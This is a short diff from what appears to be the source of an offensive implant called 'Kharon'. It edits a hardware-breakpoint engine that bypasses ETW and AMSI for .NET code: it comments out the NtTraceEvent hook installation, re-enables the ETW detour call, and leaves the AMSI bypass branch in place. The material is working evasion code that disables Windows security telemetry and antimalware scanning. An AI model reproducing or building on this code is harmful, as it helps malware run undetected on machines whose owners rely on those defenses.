@@ -411,15 +411,15 @@ auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
 
     if ( this->DotnetBypass ) {
 
-        if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
-            if ( !this->Etw.NtTraceEvent ) {
-                this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
-                KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
-            }
+        // if ( this->DotnetBypass == KH_BYPASS_ETW || this->DotnetBypass == KH_BYPASS_ALL ) {
+        //     if ( !this->Etw.NtTraceEvent ) {
+        //         this->Etw.NtTraceEvent = (UPTR)LdrLoad::Api<UPTR>( Self->Ntdll.Handle, Hsh::Str( "NtTraceEvent" ) );
+        //         KhDbg("NtTraceEvent %p %X", this->Etw.NtTraceEvent, this->Etw.NtTraceEvent );
+        //     }
 
-            Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
-            if ( ! Success ) return Success;
-        }
+        //     Success = this->Install( this->Etw.NtTraceEvent, Dr1, (PVOID)this->EtwThunk, Self->Session.ThreadID );
+        //     if ( ! Success ) return Success;
+        // }
 
         if ( this->DotnetBypass == KH_BYPASS_AMSI || this->DotnetBypass == KH_BYPASS_ALL ) {
             if ( !this->Amsi.Handle ) {
@@ -471,5 +471,5 @@ auto DECLFN HwbpEng::EtwThunk(
     _In_ PCONTEXT Ctx,
     _In_ PVOID    This 
 ) -> VOID {
-    // static_cast<Root::Kharon*>( This )->Hw->EtwDetour( Ctx );
+    static_cast<Root::Kharon*>( This )->Hw->EtwDetour( Ctx );
 }
